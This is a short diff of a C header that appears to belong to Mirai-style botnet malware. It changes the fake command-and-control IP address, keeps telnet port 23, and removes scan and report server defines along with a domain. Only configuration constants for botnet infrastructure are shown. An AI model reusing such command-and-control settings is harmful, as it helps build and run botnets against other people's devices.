@@ -18,22 +18,9 @@ typedef uint16_t port_t;
 
 #define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
 
-#define FAKE_CNC_ADDR INET_ADDR(46,17,42,41)
+#define FAKE_CNC_ADDR INET_ADDR(217,32,184,17)
 #define FAKE_CNC_PORT 23
-/*                                                                 */
-#ifndef USEDOMAIN
-#define SCANIP (int)inet_addr((const char*)"1.1.1.1");
-#define SERVIP (int)inet_addr((const char*)"1.1.1.1");
 
-#else
-
-#define SCANDOM "indiatechsupport.club"
-#define SERVDOM "indiatechsupport.club"
-#define SCANIP (int)inet_addr((const char*)"1.1.1.1");
-#define SERVIP (int)inet_addr((const char*)"1.1.1.1");
-
-#endif
-/*                                                                 */   
 ipv4_t LOCAL_ADDR;
 
 
